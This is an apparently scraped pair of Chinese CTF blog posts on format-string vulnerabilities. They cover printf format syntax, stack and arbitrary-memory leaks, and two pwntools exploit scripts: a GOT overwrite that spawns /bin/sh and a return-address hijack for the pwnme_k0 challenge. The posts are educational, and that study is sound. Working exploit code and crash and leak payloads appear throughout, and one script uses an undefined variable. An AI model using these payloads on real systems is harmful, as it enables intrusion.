class="hljs-string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)<br>sh.sendline(name)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>show_puts_payload=p32(puts_got)+<span class="hljs-string">&#x27;%7$s&#x27;</span>     <span class="hljs-comment">#通过get泄露puts函数地址</span><br>sh.sendline(show_puts_payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>puts_addr = u32(sh.recv()[:<span class="hljs-number">4</span>])   <span class="hljs-comment">#获得puts的实际地址</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>system_offset = libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>puts_offset = libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = puts_addr - puts_offset + system_offset    <span class="hljs-comment">#获得system的实际地址</span><br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>, &#123;puts_got: sys_addr&#125;)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)    <span class="hljs-comment">#读取文件内容并执行printf进行地址覆盖</span><br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>sh.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)   <span class="hljs-comment">#调用puts读取文件名实际执行system(&#x27;bin/sh;&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h1><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p><p>🌰：</p><p> 题目在这里：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">三个白帽 - pwnme_k0</a> </p><h5 id="分析题目-1"><a href="#分析题目-1" class="headerlink" title="分析题目"></a>分析题目</h5><p>检查保护：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_checksec.png"></p><p>程序实现了一个登录的功能，可以查看和修改信息。玩了一下发现没有存储功能，修改了账号密码以后它就会覆盖新的数据，不会保留原来的数据。</p><p>看一下源码</p><p>把文件拖进ida就发现程序里留有后门函数，在 <code>sub_4008A6()</code> 函数中直接<code>return system(&quot;/bin/sh&quot;)</code>。我们可以控制程序跳转到这个地方。函数地址是 <code>0x4008AA</code></p><p>在 <code>sub_400B07</code> 函数，也就是主循环中对应的选项 <code>1.Sh0w Account Information</code> 中有 <code>printf()</code> 函数没有格式化字符串，似乎有漏洞可以利用。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_printf.png"></p><p>根据函数间变量的对应关系回溯一下程序其他的函数部分，发现在当初读入的时候就是以这个形式读入的（修改账号密码时读入也是这个形式）</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_input.png"></p><h5 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h5><ul><li><p>获取system执行时的地址</p></li><li><p>获取函数返回地址，利用 printf 修改返回地址为 system 后门函数地址</p></li><li><p>利用密码输入将payload写入</p></li></ul><p>首先确定一下偏移，断点下在第二个 printf 的地方。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_stack.png"></p><p>可以看出输入的用户名在栈上的第三个位置，格式化字符串本身又在rdi上，所以偏移就是 6 + 3 - 1 &#x3D; 8。</p><p>同时栈上，第一个元素存储的是上一个函数的 rbp 也就是接下来所说的旧返回地址。栈上第二个位置存储的就是当前函数的返回地址，在格式化字符串中的偏移为 7，相对于旧返回地址的偏移为 0x7fffffffdd70 - 0x7fffffffdd38 &#x3D; 0x38。</p><p>返回地址 <code>0x400d74</code> 和目标地址 <code>0x4008AA</code>只有低字节不同，我们可以只修改低2字节 ，即：写成 <code>0x08AA = 2218</code>。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.arch=<span class="hljs-string">&quot;amd64&quot;</span><br><br>sh=process(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;modifier&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%6$p&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>ret_addr = <span class="hljs-built_in">int</span>(sh.recvline().strip(),<span class="hljs-number">16</span>) - <span class="hljs-number">0x38</span><br><br>sh.recv()<br>sh.writeline(<span class="hljs-string">&quot;2&quot;</span>)<br>sh.recv()<br>sh.sendline(p64(ret_addr))<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%2218d%8$hn&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p><strong>奇怪踩坑之我把chatGPT玩崩了</strong></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/Snipaste_2023-07-11_22-10-00.png"></p><p>问题发生在我问了 chatGPT 一个弱智问题后，它说我输入了可疑信息。😨</p><p>最后我去找了机器人客服申诉，今天把我从小黑屋放出来了。</p><p>我做错了什么我就是笨笨而已为什么把我关小黑屋😿</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>传说中的Format String 泄露任意地址和覆盖任意地址</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式，格式化字符串函数可以接受可变数量的参数，并将其第一个参数作为格式化字符串函数。像是 <code>printf(&#39;My name is %s&#39;,&#39;Modifier&#39;)</code> ，<code>printf()</code> 就是格式化字符串函数。</p><h4 id="常见的格式化字符串函数"><a href="#常见的格式化字符串函数" class="headerlink" title="常见的格式化字符串函数"></a>常见的格式化字符串函数</h4><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><ul><li>scanf</li></ul><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><ul><li>printf    输出到stdout</li><li>fprintf    输出到FILE流</li><li>vprntf    根据参数列表格式化输出到stdout</li><li>vfprintf    根据参数列表格式化输出到指定 FILE 流</li><li>sprintf    输出到字符串</li><li>snprintf   输出指定字节数到字符串</li><li>vsprintf    根据参数列表格式化输出到字符串</li><li>vsnprintf    根据参数列表格式化输出指定字节到字符串</li><li>setproctitle    设置 argv</li><li>syslog    输出日志</li></ul><h4 id="格式化字符串的格式"><a href="#格式化字符串的格式" class="headerlink" title="格式化字符串的格式"></a>格式化字符串的格式</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><strong>Parameter</strong> - 可省略</li></ul><p>表示为<code>n$</code>，这个格式说明符用于说明显示第几个参数。这使得同一个参数可以以不同的顺序被输出多次。需要注意的是，如果任意一个占位符使用了parameter，那么所有的占位符都必须使用parameter。</p><p>eg：<code>printf(&quot;%2$d ,%1$d&quot;,16,17)</code> 输出结果为<code>17，16</code></p><ul><li><strong>Flags</strong> - 可以为0或者多个</li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>仅用于数值类型。用于表示有符号数值的 <code>+</code> 或 <code>-</code> 号，缺省情况时省略正数的符号。</td></tr><tr><td>空格</td><td>作用于有符号数的输出，如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td></tr><tr><td>-</td><td>左对齐。缺省情况是右对齐。</td></tr><tr><td>#</td><td>对于 <code>g</code> 与 <code>G</code> ，不删除尾部0以表示精度。对于 <code>f</code> , <code> F</code> ,  <code>e</code> ,  <code>E</code> ,  <code>g</code> ,  <code>G</code> , 总是输出小数点。对于 <code>o</code> ,  <code>x</code> ,  <code>X</code> , 在非0数值前分别输出前缀<code>0</code>, <code>0x</code>, and <code>0X</code>表示数制。</td></tr><tr><td>0</td><td>如果 width 选项前缀以0，则在左侧用0填充直至达到宽度要求。例如<code>printf(&quot;%2d&quot;, 3)</code>输出 <code> 3</code>，而<code>printf(&quot;%02d&quot;, 3)</code>输出 <code>03</code> 。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td></tr></tbody></table><ul><li><strong>Field width</strong></li></ul><p>field width 即域宽，用于表示输出字符的最小宽度，常用于制表输出时填充固定宽度的表目。</p><p>如果实际输出内容宽度小于field width，则默认按照左对齐的标准进行填充；当实际输出内容宽度大于field width，不会截断而是原样输出。</p><p>如果域宽值为<code>*</code>，作为一个参数传递时则由对应的函数参数的值为当前域宽，例如 <code>printf(&quot;%*d&quot;,5,10)</code> ，参数<code>5</code>将传递给<code>*</code>作为这个输出的域宽。</p><p>需要注意，域宽没有负值且不能设置为0：前导的负值被解释为一个正数前导值和左对齐标志负号；前导0被解释为<code>flag</code>的0填充标志。</p><ul><li><strong>.Precision</strong></li></ul><p>Precision 是精度，在构造函数时不能忘记前缀 <code>.</code> 。precision 通常指输出的最大长度，其不同的含义依赖于具体的不同的格式化类型：</p><p>对于 <code>d</code>、<code>i</code>、<code>u</code>、<code>x</code>、<code>o</code> 的整型数值是指最小的数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。</p><p>对于 <code>a/A</code>、<code>e/E</code>、<code>f/F</code> 的浮点型数值，是指小数点后显示的位数，必要时四舍五入或补0，缺省值为6。</p><p>对于 <code>s</code> 的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。</p><p>需要注意的是，如果设置为<code>*</code>，则由对应的函数参数的值为当前精度值。例如 <code>printf(&quot;%.*s&quot;,3,&quot;abcde&quot;)</code> 的输出为 <code>abc</code> 。</p><ul><li><strong>Length</strong> - 可省略</li></ul><p>length 指输出的浮点型或者整型参数的长度，也被称为size。</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>hh</td><td>表示函数期望接收一个 char 类型的参数，并会将它提升为 int 类型。</td></tr><tr><td>h</td><td>表示函数期望接收一个 short 类型的参数，并会将它提升为 int 类型。</td></tr><tr><td>ll</td><td>表示函数接收一个 long long 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>l</td><td>表示函数接收一个 long 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>L</td><td>表示函数接收一个 long double 类型的参数，并会把它转换为 double 类型。</td></tr><tr><td>j</td><td>表示函数接收一个 intmax_t (带符号的最大宽度整型，其范围在不同的系统上可能有所变化) 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>t</td><td>表示函数接收一个 ptrdiff_t () 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>z</td><td>表示函数接收一个 size_t 类型的参数，并会把它转换为 int 类型。</td></tr></tbody></table><ul><li><strong>type</strong></li></ul><p>type就是类型转换符，可以具体如下：</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>d&#x2F;i</td><td><code>signed int</code> 。在输出时，<code>d</code> 和 <code>i</code> 同义，但在输入时有所不同。 <code>%i</code> 在输入值有前缀 <code>0x</code> 时，将数据转换为16进制；在有前缀 <code>0</code> 时，将数据转换为8进制。</td></tr><tr><td>u</td><td>十进制 <code>unsigned int</code>。</td></tr><tr><td>f&#x2F;F</td><td>固定小数点表示法表示的<code>double</code>，小数点后的位数由精度字段控制。<code>f </code>和 <code>F</code> 在输出无限大和NAN时打印出的字符串不同，<code>f</code> 为 <code>inf</code> 、 <code>infinity</code> 和 <code>nan</code> ， <code>F</code> 为 <code>INF</code> 、 <code>INFINITY</code> 和 <code>NAN</code> 。</td></tr><tr><td>e&#x2F;E</td><td>以科学计数法表示的<code>double</code>，指数部分使用小写字母 <code>e</code> 或 <code>E</code> 引入。指数至少包含两个数字，如果值为零，则指数为00。例如，<code>1.2345e+03</code>表示1.2345乘10的3次方。</td></tr><tr><td>g&#x2F;G</td><td>按照具体情况在固定小数点表示法和科学计数法之间选择合适的double。</td></tr><tr><td>x&#x2F;X</td><td>以十六进制数形式输出的 <code>signed int</code> 。x使用小写字母，X使用大写字母。</td></tr><tr><td>o</td><td>以八进制形式输出的 <code>signed int </code>。</td></tr><tr><td>s</td><td>以空字符结尾的字符串。</td></tr><tr><td>c</td><td>char（字符）。</td></tr><tr><td>p</td><td>void*（指向void的指针）以特定于实现的格式输出。<code>printf(&quot;%p&quot;,a)</code> 用地址的格式打印变量 a 的值，<code>printf(&quot;%p&quot;, &amp;a)</code> 打印变量 a 所在的地址。</td></tr><tr><td>a&#x2F;A</td><td>以十六进制表示法输出的<code>double</code>，以0x或0X开头。a使用小写字母，A使用大写字母。</td></tr><tr><td>n</td><td>不输出任何内容，但将到目前为止已写入的字符数写入整数指针参数。</td></tr></tbody></table><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>我们知道，x86是通过栈来传递函数的参数的，举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s&quot;</span>,<span class="hljs-string">&quot;hello Modifier\n&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看其执行printf时的栈结构如下（这里编译成64位的了，所以在gdb不会在栈中显示格式化字符串本身）</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/printf-stack.png"></p><p>实际栈中的结构从高到低依次是<code>&#39;\n&#39;指针 --&gt; 0xcafebabe --&gt; &#39;hello Modifier\n&#39;指针--&gt;格式化字符串指针</code></p><p>看上去一切正常，那么我们如何触发格式化字符串漏洞呢？</p><p>根据 cdecl 的调用约定，在进入 <code>printf ()</code> 函数之前，将参数从右到左依次压栈。进入 <code>printf ()</code> 之后，函数首先获取第一个参数，一次读取一个字符。</p><ul><li>如果字符不是 %，字符直接复制到输出中。</li><li>字符是%，读取下一个字符。如果字符为空则报错，如果字符为%，输出%，除此之外，获取相应的参数并解析输出。</li></ul><p>总而言之，其实格式字符串漏洞发生的条件就是<strong>格式字符串要求的参数和实际提供的参数不匹配</strong>。</p><p>如下面的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s %x %x %x&quot;</span>,<span class="hljs-string">&quot;hello Modifier&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行就会输出栈上的高地址</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-1.png"></p><p>同样，如果我们把函数写成这个样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序照样会运行，但输出如下图</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-2.png"></p><p>其中第一个%s，程序将其解析为其地址对应的字符串，如果我们提供一个不存在的地址，程序就会崩溃。</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>就像在格式化字符串原理部分说的，格式化字符串的两个利用手段就是;</p><ul><li>利用%s 对应的参数地址不合法让程序崩溃。</li><li>根据 %d，%f 输出了栈上的内容，查看栈上的内容。</li></ul><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>利用格式化字符串让程序崩溃很简单，只需要向程序输入无数个%s。对于每一个%s，程序都要获取一个栈上的数字，并把该数字视作一个地址，然后打印出地址指向的内存内容，直到出现NULL字符。但是栈上并不是每一个值都对应着一个合法的地址，总会有一个对应的内存不存在，就可以让程序崩溃。</p><p>比如：<code>printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)</code></p><p>利用这一漏洞，我们虽然不能控制程序，但是可以让服务崩溃，使得其他用户无法访问。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>我们可以利用程序崩溃来验证漏洞，除此之外我们还是要利用格式化字符串获取有效信息，为下一步的漏洞利用做准备。</p><p>我们已经知道格式化字符串函数从栈上取值，并且在x86中参数逆序（从右到左）进栈，而对于printf函数来说，实际参数也按照逆序的顺序被压入栈中，所以参数在内存中出现的顺序和printf调用时的顺序一样。</p><h5 id="泄露栈变量数值"><a href="#泄露栈变量数值" class="headerlink" title="泄露栈变量数值"></a>泄露栈变量数值</h5><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;%p %p %p\n&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);  <span class="hljs-comment">//输出三个整型变量，接着输出字符串 str</span><br>    <span class="hljs-built_in">printf</span>(str);  <span class="hljs-comment">//直接将 str 字符串作为格式化字符串</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出是这个样子的</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/use1.png"></p><p>可以看到第二个print处输出了两个地址，分别看一下两个printf的栈结构</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack-2.png"></p><p>可以看到，我们利用自己写的格式化字符串能够查看栈上的信息。</p><p>像例题这样的格式化字符串函数写法，我们只能按顺序获取栈上的参数。我们可以稍加修改，根据前面讲到的格式化字符串的格式，我们可以通过<code>%n$[type]</code>的方式查看第n个参数的值</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">200</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在开始输入%3$x，查看第二个printf处的栈结构</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-stack.png"></p><p>查看输出结果，printf输出了第3+1个参数对应的值</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-output.png"></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>还是用上面的那个程序，这次输入<code>$s</code>来试一下</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>在第二次 printf 处，程序将 0xffffcfe4 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p>需要注意的是，并不是所有这样的都会正常运行，<strong>如果对应的变量不能够被解析为字符串地址，程序就会直接崩溃</strong>。</p><p>我们尝试输入 <code>%4$s</code>，就会报错直接崩溃。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-error.png"></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><ul><li><p>可以利用 <code>%x</code> 或者 <code>%p</code> 来获取相应栈上的内存，区别是输出的信息是否包含前缀”0x”（ <code>%p</code> 会自动添加前缀”0x”，而 <code>%x</code> 不会）</p></li><li><p>利用 <code>%s</code> 来获取变量所对应地址的内容，但需要注意字符串以零字符（’\0’）作为结尾。该地址上存储的数据可能会被截断，只会输出到遇到第一个零字符为止。</p></li><li><p>利用 <code>% [n]$x</code> 来获取指定参数的值，利用 <code>%[n]$s</code> 来获取指定参数对应地址内容。</p></li></ul><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>我们在做题的时候经常会需要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这个时候我们就需要控制泄露某一个地址的内存。</p><p>一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的。也就是说，调用输出函数的时候我们的<strong>第一个参数值就是这个格式化字符串的地址</strong>。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>在我们上面输出字符串的例子中，我们可以看出栈上的第二个变量就是我们的格式化字符串地址 0xffffcFE0，同时该地址存储的也是 “%s” 格式化字符串内容。</p><p>那如果我们知道某个格式化字符串在输出的时候调用的是第几个参数，我们就可以通过下面的方法获取某个指定地址的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[addr]%[k]$s<br></code></pre></td></tr></table></figure><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>那么如何确定该格式化字符串是第几个参数呢？我们可以向程序发送如下格式的payload：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[tag]%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br></code></pre></td></tr></table></figure><p>其中 <code>[tag]</code> 是我们判断的标志，我们一般会选择重复某一个字符的机器字长作为 tag ，比如 ‘AAAA’。如果输出的栈上的内容和我们的 tag 重复了，那么这个地址大概率就是格式化字符串的地址，可以更换多个 tag 再次确认尝试。</p><p>还是之前的程序，我们输入<code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</code>来测试一下</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output.png"></p><p>其中第二次 printf 输出如下（为了方便看，我在每两个地址之间加了空格）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span> <span class="hljs-number">0</span>xffffcffc <span class="hljs-number">0</span>xf7de0012 <span class="hljs-number">0</span>x80484a0 <span class="hljs-number">0</span>xf63d4e2e <span class="hljs-number">0</span>x804825c <span class="hljs-number">0</span>x7b1ea71 <span class="hljs-number">0</span>x41414141 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025<br></code></pre></td></tr></table></figure><p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第8个参数，是格式化字符串的第7个参数。我们可以来测试一下，再一次输入 <code>%7$p</code>即可读出这里的内容。如果这是个不合法的地址，程序将会崩溃。</p><p><img 